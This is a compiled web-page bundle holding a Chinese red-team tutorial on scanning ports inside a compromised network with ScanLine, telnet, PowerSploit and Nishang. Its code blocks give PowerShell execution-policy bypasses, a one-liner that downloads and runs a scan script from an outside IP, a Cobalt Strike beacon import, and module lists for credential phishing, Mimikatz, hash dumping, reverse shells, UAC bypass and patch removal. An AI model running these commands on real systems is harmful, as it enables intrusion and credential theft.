import{_ as l,W as t,X as r,Y as n,Z as e,a0 as a,a1 as i,C as c}from"./framework-b6a07282.js";const d={},o=i(`<h2 id="内网端口信息收集" tabindex="-1"><a class="header-anchor" href="#内网端口信息收集" aria-hidden="true">#</a> 内网端口信息收集</h2><h3 id="内网端口扫描技术" tabindex="-1"><a class="header-anchor" href="#内网端口扫描技术" aria-hidden="true">#</a> 内网端口扫描技术</h3><ul><li>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的涌洞、分析目 标网络的拓扑结构等， 在进行内网渗测试时，通常会使用Metasploit内置的端口进行扫描。也可以上传端口扫描工 具，使用工具进行扫描。还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下， 可以直接使用Nmap、masscan等端口扫描工具获取开放的端口信息。</li></ul><h4 id="scanline" tabindex="-1"><a class="header-anchor" href="#scanline" aria-hidden="true">#</a> ScanLine</h4><ul><li>ScanLine是一款windows下的端口扫描的命令行程序。它可以完成PING扫描、TCP端口扫描、UDP端口扫描等功 能。运行速度很快，不需要winPcap库支持，应用场合受限较少。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>scanline.exe <span class="token parameter variable">-bhpt</span> <span class="token number">80,3389</span>,8000-9000 <span class="token number">192.168</span>.0.135

‐？ ‐ 显示此帮助文本
‐b ‐ 获取端口横幅
‐c ‐ TCP 和 UDP 尝试超时（毫秒）。 默认值为 <span class="token number">4000</span>
‐d ‐ 扫描之间的延迟（毫秒）。 默认为 <span class="token number">0</span>
‐f ‐ 从文件中读取 IP。 使用“stdin”作为标准输入
‐g ‐ 绑定到给定的本地端口
‐h ‐ 隐藏没有开放端口的系统的结果
‐i ‐ 除了 Echo 请求之外，用于 <span class="token function">ping</span> 使用 ICMP 时间戳请求
‐j ‐ 不要在 IP 之间输出“‐‐‐‐‐<span class="token punctuation">..</span>.”分隔符
‐l ‐ 从文件中读取 TCP 端口
‐L ‐ 从文件中读取 UDP 端口
‐m ‐ 绑定到给定的本地接口 IP
‐n ‐ 不扫描端口 ‐ 仅 ping（除非您使用 ‐p）
‐o ‐ 输出文件（覆盖）
‐O ‐ 输出文件（追加）
‐p ‐ 扫描前不要 <span class="token function">ping</span> 主机
‐q ‐ <span class="token function">ping</span> 超时（毫秒）。 默认值为 <span class="token number">2000</span>
‐r ‐ 将 IP 地址解析为主机名
‐s ‐ 以逗号分隔格式输出 <span class="token punctuation">(</span>csv<span class="token punctuation">)</span>
‐t ‐ 要扫描的 TCP 端口（以逗号分隔的端口/范围列表）
‐T ‐ 使用 TCP 端口的内部列表
‐u ‐ 要扫描的 UDP 端口（以逗号分隔的端口/范围列表）
‐U ‐ 使用 UDP 端口的内部列表
‐v ‐ 详细模式
‐z ‐ 随机化 IP 和端口扫描顺序
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="telnet" tabindex="-1"><a class="header-anchor" href="#telnet" aria-hidden="true">#</a> Telnet</h4><ul><li>Telnet协议是TCP/IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算 机上完成远程主机工作的能力。在目标计算机上使用Telnet协议，可以与目标服务器建立连接。如果只是想快速探 测某台主机的某个常规高危端口是否开放，使用telnet命令是最方便的</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Telnet <span class="token number">192.168</span>.1.1 <span class="token number">80</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="redteamtool" tabindex="-1"><a class="header-anchor" href="#redteamtool" aria-hidden="true">#</a> RedTeamTool</h4><ul><li>RedTeamTool是个工具集，以下命令展示它本地端口扫面的工具</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>RedTeamTool.exe <span class="token number">8100</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="powerspioit" tabindex="-1"><a class="header-anchor" href="#powerspioit" aria-hidden="true">#</a> PowerSpioit</h4>`,13),p=n("li",null,"PowerSploit是一款基于PowerShell的后渗透框架软件，包含了很多PowerShell的攻击脚本，它们主要用于渗透中 的信息侦测，权限提升、权限维持等",-1),u={href:"https://github.com/PowerShellMafia/PowerSploit",target:"_blank",rel:"noopener noreferrer"},v=i(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#本地执行，将Invoke‐Portscan.ps1脚本上传至靶机</span>
powershell ‐exec bypass Import‐Module .<span class="token punctuation">\\</span>Invoke‐Portscan.ps1<span class="token punctuation">;</span>Invoke‐Portscan ‐Hosts <span class="token number">192.168</span>.0.0/24 ‐T <span class="token number">4</span> ‐ports <span class="token string">&#39;445,8080,3389,80&#39;</span> ‐oA C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>XY<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>saomiao.txt

powershell.exe <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-command</span> <span class="token string">&quot;&amp; { import-module C:\\Users\\Administrator\\Desktop\\PowerView.ps1;Get-NetShare}&quot;</span>

<span class="token comment">#远程执行</span>
python <span class="token parameter variable">-m</span> http.server <span class="token number">80</span> 开启http服务
python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>

powershell ‐exec bypass ‐c IEX <span class="token punctuation">(</span>New‐ObjectSystem.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>importmodule .<span class="token punctuation">\\</span>Invoke‐Portscan.ps1<span class="token punctuation">;</span>Invoke‐Portscan ‐Hosts <span class="token number">192.168</span>.41.0/24 ‐T <span class="token number">4</span> ‐ports <span class="token string">&#39;445,8080,3389,80&#39;</span> ‐oA c:<span class="token punctuation">\\</span><span class="token number">1</span>.txt


powershell <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-c</span> IEX <span class="token punctuation">(</span>New-Object System.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.0.142:80/PowerView.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>import-module .<span class="token punctuation">\\</span>PowerView.ps1<span class="token punctuation">;</span>Get-NetShare


ActivirusBypass：发现杀毒软件的查杀特征
CodeExecution：在目标主机上执行代码
Exfiltration：目标主机上的信息搜集工具
Mayhem：蓝屏等破坏性的脚本
Persistence：后门脚本
Privsec：提权等脚本
Recon：以目标主机为跳板进行内网信息侦查
ScriptModification：在目标主机上创建或修改脚本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="nishang" tabindex="-1"><a class="header-anchor" href="#nishang" aria-hidden="true">#</a> Nishang</h4>`,2),m=n("li",null,"Nishang是一款针对PowerShell的渗透工具。说到渗透工具，那自然便是老外开发的东西。国人开发的东西，也不 是不行，只不过不被认可罢了。不管是谁开发的，既然跟渗透有关系，那自然是对我们有帮助的，学习就好。来源 什么的都不重要。总之，nishang也是一款不可多得的好工具。非常的好用。（很复杂）",-1),b={href:"https://github.com/samratashok/nishang",target:"_blank",rel:"noopener noreferrer"},h={href:"https://dude6.com/article/116047.html",target:"_blank",rel:"noopener noreferrer"},k=i(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#超级迷你解压小工具unzip.exe</span>
<span class="token function">unzip</span> 文件名

<span class="token comment">#使用方式 整个文件都要上传至服务器</span>
Set‐ExecutionPolicy remotesigned 允许导入
Import‐Module .<span class="token punctuation">\\</span>nishang.psm1 导入模块
Invoke‐PortScan ‐StartAddress <span class="token number">192.168</span>.41.1 ‐EndAddress <span class="token number">192.168</span>.41.21 ‐ResolveHost 扫描
powershell ‐command <span class="token string">&quot;&amp; { import‐module .<span class="token entity" title="\\n">\\n</span>ishang<span class="token entity" title="\\n">\\n</span>ishang.psm1; Invoke‐PortScan ‐StartAddress
192.168.41.1 ‐EndAddress 192.168.41.255 ‐ResolveHost }&quot;</span>

<span class="token comment">#将nishang整个文件夹导入到cs工具目录下</span>
beacon<span class="token operator">&gt;</span> powershell‐import .<span class="token punctuation">\\</span>nishang<span class="token punctuation">\\</span>nishang.psm1 //导入各种powershell脚本，这里可以导入nishang模块


Get-Command <span class="token parameter variable">-Module</span> nishang 查看命令
Check-VM 检测该主机是不是虚拟机
Invoke-CredentialsPhish 欺骗用户，让用户输入密码
Get-WLAN-Keys wifi 信息
Invoke-Mimikatz 抓密码
Get-PassHashes 获取hash
Get-PassHints 获取用户的密码提示信息
Invoke-PowerShellTcp 反弹shell
Invoke-PsUACme 绕过UAC
Remove-Update 删除补丁
Get-Information 本机信息
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="kscan" tabindex="-1"><a class="header-anchor" href="#kscan" aria-hidden="true">#</a> Kscan</h4><h4 id="fscan" tabindex="-1"><a class="header-anchor" href="#fscan" aria-hidden="true">#</a> Fscan</h4>`,3);function g(P,_){const s=c("ExternalLinkIcon");return t(),r("div",null,[o,n("ul",null,[p,n("li",null,[n("a",u,[e("https://github.com/PowerShellMafia/PowerSploit"),a(s)])])]),v,n("ul",null,[m,n("li",null,[n("a",b,[e("https://github.com/samratashok/nishang"),a(s)])]),n("li",null,[n("a",h,[e("https://dude6.com/article/116047.html"),a(s)])])]),k])}const w=l(d,[["render",g],["__file","内网端口信息收集.html.vue"]]);export{w as default};
